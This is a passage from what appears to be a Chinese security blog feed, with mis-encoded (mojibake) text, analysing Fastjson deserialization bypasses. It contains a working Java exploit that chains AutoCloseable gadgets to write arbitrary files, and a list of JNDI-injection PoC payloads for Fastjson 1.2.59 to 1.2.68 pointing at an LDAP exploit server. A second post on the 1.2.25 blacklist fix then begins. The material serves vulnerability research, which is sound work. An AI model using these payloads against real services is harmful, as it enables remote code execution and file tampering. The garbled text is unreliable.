class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Creates new BlockDataOutputStream on top of given underlying stream.  </span></span><br><span class="line"><span class="comment"> * Block data mode is turned off by default.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> BlockDataOutputStream(OutputStream out) &#123;  </span><br><span class="line"> <span class="built_in">this</span>.out = out;  </span><br><span class="line"> dout = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(<span class="built_in">this</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Sets block data mode to the given mode (true == on, false == off)  </span></span><br><span class="line"><span class="comment"> * and returns the previous mode value.  If the new mode is the same as  </span></span><br><span class="line"><span class="comment"> * the old mode, no action is taken.  If the new mode differs from the  </span></span><br><span class="line"><span class="comment"> * old mode, any buffered data is flushed before switching to the new  </span></span><br><span class="line"><span class="comment"> * mode.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="type">boolean</span> <span class="title function_">setBlockDataMode</span><span class="params">(<span class="type">boolean</span> mode)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"> <span class="keyword">if</span> (blkmode == mode) &#123;  </span><br><span class="line"> <span class="keyword">return</span> blkmode;  </span><br><span class="line"> &#125;  </span><br><span class="line"> drain();  </span><br><span class="line"> blkmode = mode;  </span><br><span class="line"> <span class="keyword">return</span> !blkmode;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">...  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Writes all buffered data from this stream to the underlying stream,  </span></span><br><span class="line"><span class="comment"> * but does not flush underlying stream.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="keyword">void</span> <span class="title function_">drain</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"> <span class="keyword">if</span> (pos == <span class="number">0</span>) &#123;  </span><br><span class="line"> <span class="keyword">return</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="keyword">if</span> (blkmode) &#123;  </span><br><span class="line"> writeBlockHeader(pos);  </span><br><span class="line"> &#125;  </span><br><span class="line"> out.write(buf, <span class="number">0</span>, pos);  </span><br><span class="line"> pos = <span class="number">0</span>;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>ÂØπ‰∫ésetBlockDataMode()ÂáΩÊï∞ÁöÑË∞ÉÁî®ÔºåÂú®ObjectOutputStreamÁ±ªÁöÑÊúâÂèÇÊûÑÈÄ†ÂáΩÊï∞‰∏≠Â∞±Â≠òÂú®Ôºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"> verifySubclass();  </span><br><span class="line"> bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);  </span><br><span class="line"> handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);  </span><br><span class="line"> subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);  </span><br><span class="line"> enableOverride = <span class="literal">false</span>;  </span><br><span class="line"> writeStreamHeader();  </span><br><span class="line"> bout.setBlockDataMode(<span class="literal">true</span>);  </span><br><span class="line"> <span class="keyword">if</span> (extendedDebugInfo) &#123;  </span><br><span class="line"> debugInfoStack = <span class="keyword">new</span> <span class="title class_">DebugTraceInfoStack</span>();  </span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line"> debugInfoStack = <span class="literal">null</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>‰ΩÜÊòØFastjson‰ºòÂÖàËé∑ÂèñÁöÑÊòØObjectOutputStreamÁ±ªÁöÑÊó†ÂèÇÊûÑÈÄ†ÂáΩÊï∞ÔºåÂõ†Ê≠§Âè™ËÉΩÊâæObjectOutputStreamÁöÑÁªßÊâøÁ±ªÊù•Ëß¶Âèë‰∫Ü„ÄÇ<br>Âè™ÊúâÊúâÂèÇÊûÑÈÄ†ÂáΩÊï∞ÁöÑObjectOutputStreamÁªßÊâøÁ±ªÔºö<strong>com.sleepycat.bind.serial.SerialOutput</strong><br>ÁúãÂà∞ÔºåSerialOutputÁ±ªÁöÑÊûÑÈÄ†ÂáΩÊï∞‰∏≠ÊòØË∞ÉÁî®‰∫ÜÁà∂Á±ªObjectOutputStreamÁöÑÊúâÂèÇÊûÑÈÄ†ÂáΩÊï∞ÔºåËøôÂ∞±Êª°Ë∂≥‰∫ÜÂâçÈù¢ÁöÑÊù°‰ª∂‰∫ÜÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SerialOutput</span><span class="params">(OutputStream out, ClassCatalog classCatalog)</span>  </span><br><span class="line"> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">  </span><br><span class="line"> <span class="built_in">super</span>(out);  </span><br><span class="line"> <span class="built_in">this</span>.classCatalog = classCatalog;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/* guarantee that we&#x27;ll always use the same serialization format */</span>  </span><br><span class="line">  </span><br><span class="line"> useProtocolVersion(ObjectStreamConstants.PROTOCOL_VERSION_2);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>expÂ¶Ç‰∏ãÔºåÁî®Âà∞‰∫ÜFastjsonÂæ™ÁéØÂºïÁî®ÁöÑÊäÄÂ∑ßÊù•Ë∞ÉÁî®Ôºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.internal.localstore.SafeFileOutputStream;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass68</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line"><span class="comment">//        String s = &quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;, \&quot;tempPath\&quot;:\&quot;C:/Windows/win.ini\&quot;, \&quot;targetPath\&quot;:\&quot;E:/flag.txt\&quot;&#125;&quot;;  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    \&quot;stream\&quot;: &#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;targetPath\&quot;: \&quot;E:/hacked.txt\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;tempPath\&quot;: \&quot;E:/test.txt\&quot;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    \&quot;writer\&quot;: &#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.esotericsoftware.kryo.io.Output\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;buffer\&quot;: \&quot;cHduZWQ=\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;outputStream\&quot;: &#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;            \&quot;$ref\&quot;: \&quot;$.stream\&quot;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        &#125;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;position\&quot;: 5\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    \&quot;close\&quot;: &#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.sleepycat.bind.serial.SerialOutput\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;out\&quot;: &#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;            \&quot;$ref\&quot;: \&quot;$.writer\&quot;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        &#125;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280031246.png" alt="image-20230828003107850"><br>ËøôÈáåÂÜôÂÖ•Êñá‰ª∂ÂÜÖÂÆπÂÖ∂ÂÆûÊúâÈôêÂà∂ÔºåÊúâÁöÑÁâπÊÆäÂ≠óÁ¨¶Âπ∂‰∏çËÉΩÁõ¥Êé•ÂÜôÂÖ•Âà∞ÁõÆÊ†áÊñá‰ª∂‰∏≠ÔºåÊØîÂ¶ÇÂÜô‰∏çËøõPHP‰ª£Á†ÅÁ≠â„ÄÇ<br>ËøôÈáåÂ∞±ÊúâÁÇπÊ≤°ÊáÇ‰∫ÜÔºåÊàëÁöÑtest.txtÂÖ∂ÂÆûÊòØ‰∏çÂ≠òÂú®ÁöÑ‰ΩÜÊòØ‰πüÂà©Áî®ÊàêÂäü‰∫ÜÔºü‰ªîÁªÜÂÆ°‰∏Ä‰∏ãSafeFileOutputStream‰ª£Á†ÅÔºàÊàëÈù†GPTÔºâ</p><ul><li><code>SafeFileOutputStream(File file)</code>ÔºöÊûÑÈÄ†ÂáΩÊï∞Êé•Âèó‰∏Ä‰∏™FileÂØπË±°ÔºåÂÆÉ‰ºöË∞ÉÁî®Âè¶‰∏Ä‰∏™ÊûÑÈÄ†ÂáΩÊï∞Êù•ÂàùÂßãÂåñ„ÄÇÂÆÉÂ∞ÜÊñá‰ª∂ÁöÑÁªùÂØπË∑ØÂæÑ‰º†ÈÄíÁªôÁ¨¨‰∫å‰∏™ÊûÑÈÄ†ÂáΩÊï∞ÔºåtempPathÂèÇÊï∞‰∏∫null„ÄÇ</li><li><code>SafeFileOutputStream(String targetPath, String tempPath)</code>ÔºöËøô‰∏™ÊûÑÈÄ†ÂáΩÊï∞Áî®‰∫éÂàùÂßãÂåñSafeFileOutputStreamÂØπË±°„ÄÇÂÆÉÈ¶ñÂÖàÂàõÂª∫‰∏Ä‰∏™FileÂØπË±°Êù•Ë°®Á§∫ÁõÆÊ†áÊñá‰ª∂ÔºåÁÑ∂ÂêéË∞ÉÁî®<code>createTempFile</code>ÊñπÊ≥ïÂàõÂª∫‰∏Ä‰∏™FileÂØπË±°Êù•Ë°®Á§∫‰∏¥Êó∂Êñá‰ª∂„ÄÇÊé•ÁùÄÔºåÂÆÉÊ£ÄÊü•ÁõÆÊ†áÊñá‰ª∂ÊòØÂê¶Â≠òÂú®ÔºåÂ¶ÇÊûú‰∏çÂ≠òÂú®ÔºåÂàôÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑBufferedOutputStreamÂØπË±°Áî®‰∫éÂÜôÂÖ•ÁõÆÊ†áÊñá‰ª∂ÔºåÂê¶ÂàôÂ∞Ü‰∏¥Êó∂Êñá‰ª∂ÁöÑÂÜÖÂÆπÂ§çÂà∂Âà∞ÁõÆÊ†áÊñá‰ª∂‰∏≠„ÄÇ</li></ul><p>Â§çÂà∂Êñá‰ª∂ÊòØÂ¶ÇÊûútempPathÂ≠òÂú®Â∞±‰ºöÁõ¥Êé•Â§çÂà∂ÔºåÂ¶ÇÊûú‰∏çÂ≠òÂú®‰∏ç‰ºöÂàõÂª∫ÂÆÉÂè™ÊòØÁî®Êù•ÊåáÂÆöË∑ØÂæÑÔºå‰ΩÜÊòØÂÜôÊñá‰ª∂Â∞±ÊòØÂà©Áî®bufferÂèÇÊï∞Â∞±ÂÜôÂÖ•ÂÜÖÂÆπÁÑ∂ÂêéÁîüÊàê‰∏Ä‰∏™Êñá‰ª∂Ôºå‰ΩÜÊòØÂú®ÂÆûÈôÖÊ∏óÈÄè‰∏≠ÊÄé‰πàÂà©Áî®ËøòÊòØÊ≤°getÂà∞ÔºåÈöæÈÅìÊòØÁõ¥Êé•ÂÜôshellÔºü</p><h2 id="ÂÖ∂‰ªñ‰∏Ä‰∫õÁªïËøáÈªëÂêçÂçïÁöÑGadget"><a href="#ÂÖ∂‰ªñ‰∏Ä‰∫õÁªïËøáÈªëÂêçÂçïÁöÑGadget" class="headerlink" title="ÂÖ∂‰ªñ‰∏Ä‰∫õÁªïËøáÈªëÂêçÂçïÁöÑGadget"></a>ÂÖ∂‰ªñ‰∏Ä‰∫õÁªïËøáÈªëÂêçÂçïÁöÑGadget</h2><p>ËøôÈáåË°•ÂÖÖ‰∏ãÂÖ∂‰ªñ‰∏Ä‰∫õGadgetÔºåÂèØËá™Ë°åÂ∞ùËØï„ÄÇÊ≥®ÊÑèÔºåÂùáÈúÄË¶ÅÂºÄÂêØAutoTypeÔºå‰∏î‰ºöË¢´JNDIÊ≥®ÂÖ•Âà©Áî®ÊâÄÂèóÁöÑJDKÁâàÊú¨ÈôêÂà∂„ÄÇ</p><h3 id="1-2-59"><a href="#1-2-59" class="headerlink" title="1.2.59"></a>1.2.59</h3><p>com.zaxxer.hikari.HikariConfigÁ±ªPoCÔºö</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span>Êàñ<span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-61"><a href="#1-2-61" class="headerlink" title="1.2.61"></a>1.2.61</h3><p>org.apache.commons.proxy.provider.remoting.SessionBeanProviderÁ±ªPoCÔºö</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span><span class="punctuation">,</span><span class="attr">&quot;jndiName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Object&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-62"><a href="#1-2-62" class="headerlink" title="1.2.62"></a>1.2.62</h3><p>org.apache.cocoon.components.slide.impl.JMSContentInterceptorÁ±ªPoCÔºö</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.util.Hashtable&quot;</span><span class="punctuation">,</span><span class="attr">&quot;java.naming.factory.initial&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;topic-factory&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;namespace&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h3><p>org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfigÁ±ªPoCÔºö</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span>Êàñ<span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>com.caucho.config.types.ResourceRefÁ±ªPoCÔºö</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.caucho.config.types.ResourceRef&quot;</span><span class="punctuation">,</span><span class="attr">&quot;lookupName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.value&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Êú™Áü•ÁâàÊú¨"><a href="#Êú™Áü•ÁâàÊú¨" class="headerlink" title="Êú™Áü•ÁâàÊú¨"></a>Êú™Áü•ÁâàÊú¨</h3><p>org.apache.aries.transaction.jms.RecoverablePooledConnectionFactoryÁ±ªPoCÔºö</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;tmJndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;tmFromJndi&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="attr">&quot;transactionManager&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.transactionManager&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>org.apache.aries.transaction.jms.internal.XaPooledConnectionFactoryÁ±ªPoCÔºö</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;tmJndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;tmFromJndi&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="attr">&quot;transactionManager&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.transactionManager&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h2><p>Áªà‰∫éÊääÂü∫Á°ÄÁöÑÈìæÂ≠êÂãâÂº∫Â≠¶ÂÆå‰∫ÜÔºåÂèØ‰ª•ÁúãÂÖ∂ÂÆÉÁöÑ‰∫ÜÔºå‰∏çËøáËøô‰∫õËøòÊòØÂæóÊó∂‰∏çÊó∂Áúã‰∏ã‰∏çÁÑ∂‰∏Ä‰∏ãÂ∞±Âøò‰∫Ü</p><p><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/704/">FastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥û(4)‚Äî1.2.68ÁâàÊú¨ ‚Äì JohnFrod‚Äôs Blog</a><br><a href="https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">JavaÂèçÂ∫èÂàóÂåñFastjsonÁØá04-Fastjson1.2.62-1.2.68ÁâàÊú¨ÂèçÂ∫èÂàóÂåñÊºèÊ¥û | Drunkbaby‚Äôs Blog (drun1baby.top)</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson1.2.25-1.2.47ÁªïËøá</title>
      <link href="/2023/08/Fastjson1-2-25-1-2-47%E7%BB%95%E8%BF%87/"/>
      <url>/2023/08/Fastjson1-2-25-1-2-47%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="1-2-25-‰øÆÂ§çÂàÜÊûê"><a href="#1-2-25-‰øÆÂ§çÂàÜÊûê" class="headerlink" title="1.2.25 ‰øÆÂ§çÂàÜÊûê"></a>1.2.25 ‰øÆÂ§çÂàÜÊûê</h2><p>È¶ñÂÖàÂØºÂÖ•1.2.25ÁâàÊú¨ÁöÑ‰øÆÂ§çÂêßÔºåÂú®pom.xml‰∏≠ÂØºÂÖ•ÂØπÂ∫îÁâàÊú¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.25</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>ËøêË°å‰∏Ä‰∏ãTemplatesImplËøôÊù°ÈìæÂèëÁé∞Â≠òÂú®‰πãÂâçÊ≤°ÊúâÁöÑÊä•Èîô<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272358332.png" alt="image-20230827235812190"><br>Ë∞ÉËØï‰∏Ä‰∏ãÂèëÁé∞Êù•Âà∞‰∫Ü‰∏ãÈù¢ËøôÈáå<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272358333.png" alt="image-20230827235838109"><br>Âú®1.2.24ÁâàÊú¨‰∏≠ËøôÈáåÊòØÁõ¥Êé•Ë∞ÉÁî®‰∫ÜloadClassÂ¶Ç‰∏ãÂõæ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272359037.png" alt="image-20230827235905974"><br>ËÄåÂú®1.2.25ÈáåÊòØË∞ÉÁî®‰∫Ü<code>checkAutoType</code>ËøõÂéªÁúãÁúãËøô‰∏™ÊñπÊ≥ïÂπ≤‰∫Ü‰ªÄ‰πàÔºåËøôÈáåÁôΩÊó•Ê¢¶ÁªÑÈïøÊ†πÊçÆÊµÅÁ®ãÁîª‰∫Ü‰∏Ä‰∏™ÊµÅÁ®ãÂõæÂ¶Ç‰∏ãÔºåÊâãÂ∑•Â§çÂà∂ÂèØËÉΩ‰ºöÊúâ‰∫õÈîôËØØ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272359164.png" alt="image-20230827235921948"><br>Âú®<code>checkAutoType</code>‰∏≠ÈÄöËøáÈªëÔºàdenyListÔºâÁôΩÔºàacceptListÔºâÂêçÂçïÂØπÁ±ªËøõË°åÊ£ÄÈ™å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272359242.png" alt="image-20230827235939729"><br>ËøôÈáåÁôΩÂêçÂçïÈªòËÆ§‰∏∫Á©∫ÔºåÂèØÊâãÂä®Ê∑ªÂä†ÔºåÈªëÂêçÂçïÈªòËÆ§‰∏ç‰∏∫Á©∫ÔºåÂú®ÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåautoTypeSupport‰∏∫FalseÔºåÂç≥ÂÖàËøõË°åÈªëÂêçÂçïËøáÊª§ÔºåÈÅçÂéÜdenyListÔºåÂ¶ÇÊûúÂºïÂÖ•ÁöÑÂ∫ì‰ª•denyList‰∏≠Êüê‰∏™denyÂºÄÂ§¥ÔºåÂ∞±‰ºöÊäõÂá∫ÂºÇÂ∏∏Ôºå‰∏≠Êñ≠ËøêË°åÔºåÂèØ‰ª•ÁúãÂà∞Âõæ‰∏≠Â∞±Ê£ÄÊü•Âà∞‰∫Ü<code>com.sun</code>ÁÑ∂ÂêéÁõ¥Êé•Ë∑≥Âá∫‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272359339.png" alt="image-20230827235957813"><br>denyListÈªëÂêçÂçï‰∏≠ÂàóÂá∫‰∫ÜÂ∏∏ËßÅÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂà©Áî®ÈìæGadgetsÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 